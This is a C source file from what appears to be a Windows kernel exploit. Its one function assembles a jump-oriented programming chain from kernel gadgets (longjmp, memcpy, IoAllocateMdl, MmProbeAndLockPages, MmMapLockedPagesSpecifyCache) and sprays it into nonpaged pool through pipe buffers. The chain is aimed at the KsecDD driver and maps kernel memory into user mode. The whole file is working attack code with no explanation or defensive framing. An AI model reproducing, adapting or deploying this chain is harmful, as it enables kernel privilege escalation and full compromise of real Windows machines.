#include "jop/jop.h"
#include "jop/gadgets.h"
#include "jop/offsets.h"
#include "launcher/kexecdd.h"
#include "utils/alloc.h"
#include "utils/error.h"
#include "utils/pipes.h"
#include "utils/vec.h"
#include <processthreadsapi.h>
#include <setjmp.h>
#include <stdio.h>
#include <string.h>

bool jop_build_jop_chain(
    Vec *vec_pipes, GadgetsData *gadgets, KsecReturnStruct **return_struct, HANDLE write_pipe
)
{

    _JUMP_BUFFER *context1 = nullptr, *context2 = nullptr;
    DispatcherStruct *dispatch1 = nullptr;
    StackArgs *stack_args1 = nullptr;
    StackArgsWithRetAddr *stack_args2 = nullptr, *stack_args3 = nullptr;
    SaveReturnValueStruct *save_struct1 = nullptr;
    KsecReturnStruct *ksec_jop_struct = nullptr;
    Caller *caller1 = nullptr, *caller2 = nullptr, *caller3 = nullptr;
    bool result = false;
    size_t stack_args1_kernel_address = 0, context1_kernel_address = 0, context2_kernel_address = 0,
           dispatch1_kernel_address = 0, saved_call_addr_kernel_address = 0,
           saved_call2_addr_kernel_address = 0, stack_args2_kernel_address = 0,
           saved_call3_addr_kernel_address, stack_args3_kernel_address = 0;

    stack_args1 = jalloc(0x10 + sizeof(CallArgs) * 10);
    stack_args2 = jalloc(8 + 0x10 + sizeof(CallArgs) * 10);
    stack_args3 = jalloc(8 + 0x10 + sizeof(CallArgs) * 10);
    context1 = jalloc(sizeof(_JUMP_BUFFER));
    context2 = jalloc(sizeof(_JUMP_BUFFER));
    dispatch1 = jalloc(sizeof(DispatcherStruct));
    save_struct1 = jalloc(sizeof(SaveReturnValueStruct));
    ksec_jop_struct = jalloc(sizeof(KsecReturnStruct));
    caller1 = jalloc(sizeof(Caller));
    caller2 = jalloc(sizeof(Caller));
    caller3 = jalloc(sizeof(Caller));

    if (context1 == nullptr || dispatch1 == nullptr || context2 == nullptr ||
        stack_args1 == nullptr || save_struct1 == nullptr || ksec_jop_struct == nullptr ||
        caller1 == nullptr || caller2 == nullptr || stack_args2 == nullptr)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed allocating memory\n");
        goto end;
    }

    caller3->target_function = gadgets->call_rax_load_regs_jmp_rax;
    caller3->save_and_restore_gadget = gadgets->save_rax_rsi;
    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        8,
        caller3,
        sizeof(*caller3),
        write_pipe,
        &saved_call3_addr_kernel_address
    );

    caller2->target_function = gadgets->call_rax_load_regs_jmp_rax;
    caller2->save_and_restore_gadget = gadgets->save_rax_rsi;
    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        7,
        caller2,
        sizeof(*caller2),
        write_pipe,
        &saved_call2_addr_kernel_address
    );
    caller1->target_function = gadgets->call_rax_load_regs_jmp_rax;
    caller1->save_and_restore_gadget = gadgets->save_rax_rsi;
    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        6,
        caller1,
        sizeof(*caller1),
        write_pipe,
        &saved_call_addr_kernel_address
    );

    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }

    stack_args3->ret_addr_start = gadgets->load_first_arguments_from_stack;

    stack_args3->args.args[0].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args3->args.args[0].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args3->args.args[0].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args3->args.args[0].Rcx = 0xAAAABBBBAAAABBBB; // MemoryDescriptorList
    stack_args3->args.args[0].Rdx = KernelMode;         // AccessMode
    stack_args3->args.args[0].R8 = IoWriteAccess;       // Operation
    stack_args3->args.args[0].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args3->args.args[1].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args3->args.args[1].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args3->args.args[1].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args3->args.args[1].new_rdi = gadgets->mm_map_locked_pages_specify_cache; // POP RBP VALUE

    stack_args3->args.args[2].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args3->args.args[2].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args3->args.args[2].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args3->args.args[2].Rcx = 0xAAAABBBBAAAABBBB; // MemoryDescriptorList
    stack_args3->args.args[2].Rdx = UserMode;           // AccessMode
    stack_args3->args.args[2].R8 = MmNonCached;         // CacheType
    stack_args3->args.args[2].R9 = 0x0;                 // RequestedAddress
    stack_args3->args.args[2].arg5 = 0;                 // BugCheckOnFailure
    stack_args3->args.args[2].arg6 = LowPagePriority;   // Priority
    stack_args3->args.args[2].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args3->args.args[3].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args3->args.args[3].call_dest = gadgets->zw_terminate_thread;
    stack_args3->args.args[3].Rcx = (size_t)GetCurrentThread();
    stack_args3->args.args[3].Rdx = 0x1234;

    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        5,
        stack_args3,
        8 + 0x10 + sizeof(CallArgs) * 10,
        write_pipe,
        &stack_args3_kernel_address
    );
    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }
    //
    stack_args2->ret_addr_start = gadgets->load_first_arguments_from_stack;

    stack_args2->args.args[0].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[0].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args2->args.args[0].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[0].Rcx = 0xAAAABBBBAAAABBBB; // Gets overwritten by 1st memcpy
    stack_args2->args.args[0].Rdx = 0x1000;             // Length
    stack_args2->args.args[0].R8 = 0x0;                 // SecondaryBuffer
    stack_args2->args.args[0].R9 = 0x0;                 // ChargeQuota
    stack_args2->args.args[0].arg5 = 0x1;               // IRP
    stack_args2->args.args[0].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args2->args.args[1].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[1].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args2->args.args[1].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[1].new_rdi = gadgets->memcpy; // POP RBP VALUE

    stack_args2->args.args[2].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[2].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args2->args.args[2].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[2].Rcx = stack_args3_kernel_address +
                                    offsetof(StackArgsWithRetAddr, args) +
                                    offsetof(StackArgs, args) + offsetof(CallArgs, Rcx); // dest
    stack_args2->args.args[2].Rdx =
        saved_call2_addr_kernel_address + offsetof(Caller, pointer_address); // source
    stack_args2->args.args[2].R8 = 0x8;                                      // size
    stack_args2->args.args[2].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args2->args.args[3].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[3].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args2->args.args[3].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[3].Rcx =
        stack_args3_kernel_address + offsetof(StackArgsWithRetAddr, args) +
        offsetof(StackArgs, args) + offsetof(CallArgs, Rcx) + sizeof(CallArgs) * 2; // dest
    stack_args2->args.args[3].Rdx = stack_args3_kernel_address +
                                    offsetof(StackArgsWithRetAddr, args) +
                                    offsetof(StackArgs, args) + offsetof(CallArgs, Rcx); // source
    stack_args2->args.args[3].R8 = 0x8;                                                  // size
    stack_args2->args.args[3].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args2->args.args[4].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[4].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args2->args.args[4].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[4].Rcx = gadgets->stack - 0x3000;    // dest
    stack_args2->args.args[4].Rdx = stack_args3_kernel_address; // src
    stack_args2->args.args[4].R8 = 8 + 0x10 + sizeof(CallArgs) * 10;  // size
    stack_args2->args.args[4].new_rsi =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args2->args.args[5].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[5].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args2->args.args[5].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[5].new_rdi = gadgets->mm_probe_and_lock_pages; // POP RBP VALUE

    stack_args2->args.args[6].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args2->args.args[6].call_dest = gadgets->load_first_arguments_from_stack;
    stack_args2->args.args[6].padd3 = gadgets->pop_rsp_ret;
    stack_args2->args.args[6].arg9 = gadgets->stack - 0x3000; // Rsp

    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        4,
        stack_args2,
        8 + 0x10 + sizeof(CallArgs) * 10,
        write_pipe,
        &stack_args2_kernel_address
    );

    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }
    stack_args1->args[0].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[0].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args1->args[0].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[0].new_rsi =
        saved_call2_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args1->args[1].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[1].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args1->args[1].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[1].new_rdi = gadgets->add_gadget; // POP RBP VALUE

    stack_args1->args[2].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[2].Rcx =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address) - ADD_GADGET_OFFSET;
    stack_args1->args[2].Rdx = GafKeyMap_OFFSET;
    stack_args1->args[2].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args1->args[2].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[2].new_rsi =
        saved_call2_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args1->args[3].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[3].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args1->args[3].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[3].new_rdi = gadgets->memcpy; // POP RBP VALUE

    stack_args1->args[4].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[4].call_dest = gadgets->call_rbp_jmp_deref_rsi;
    stack_args1->args[4].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[4].Rcx = stack_args2_kernel_address + offsetof(StackArgsWithRetAddr, args) +
                               offsetof(StackArgs, args) + offsetof(CallArgs, Rcx); // dest
    stack_args1->args[4].Rdx =
        saved_call_addr_kernel_address + offsetof(Caller, pointer_address); // src
    stack_args1->args[4].R8 = 8;                                            // size
    stack_args1->args[4].new_rsi =
        saved_call2_addr_kernel_address + offsetof(Caller, pointer_address);

    stack_args1->args[5].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[5].call_dest = gadgets->add_rsp_pop_rbp;
    stack_args1->args[5].ret_addr = gadgets->load_first_arguments_from_stack;
    stack_args1->args[5].new_rdi = gadgets->io_allocate_mdl; // POP RBP VALUE

    stack_args1->args[6].Rax = gadgets->pop_rax_jmp_deref_rsi;
    stack_args1->args[6].call_dest = gadgets->load_first_arguments_from_stack;
    stack_args1->args[6].padd3 = gadgets->pop_rsp_ret; // New RSP
    stack_args1->args[6].arg9 = stack_args2_kernel_address;

    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        3,
        stack_args1,
        0x10 + sizeof(CallArgs) * 7,
        write_pipe,
        &stack_args1_kernel_address
    );

    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }

    context2->Rsp = stack_args1_kernel_address;
    context2->Rip = gadgets->load_first_arguments_from_stack;
    context2->Rsi = saved_call_addr_kernel_address + offsetof(Caller, pointer_address);
    context2->Rbp =
        gadgets->sgd_get_user_session_state; // could use another round to pop rbp, but i'm too lazy
    //

    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        2,
        context2,
        sizeof(*context2),
        write_pipe,
        &context2_kernel_address
    );
    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }

    dispatch1->Rax = gadgets->longjump_internal;
    dispatch1->Rcx = gadgets->mov_rcx_r13_call_rax;
    dispatch1->Rdi = 0;
    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        1,
        dispatch1,
        sizeof(*dispatch1),
        write_pipe,
        &dispatch1_kernel_address
    );
    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }
    //
    context1->Rsp = gadgets->stack - 0x1000;
    context1->R13 = context2_kernel_address;
    context1->Rdi = dispatch1_kernel_address;
    context1->Rip = gadgets->jump_dispatcher;

    result = pipes_map_buffer_in_nonpaged_pool(
        vec_pipes,
        0,
        context1,
        sizeof(*context1),
        write_pipe,
        &context1_kernel_address
    );
    if (result == false)
    {
        CHILD_LOG_ERROR(write_pipe, "Failed mapping.\n");
        goto end;
    }

    ksec_jop_struct->function = gadgets->longjump;
    ksec_jop_struct->arg1 = context1_kernel_address;

    CHILD_LOG_SUCCESS(write_pipe, "Context1 address %llx\n", context1_kernel_address);

    *return_struct = ksec_jop_struct;

    result = true;
end:
    return result;
}
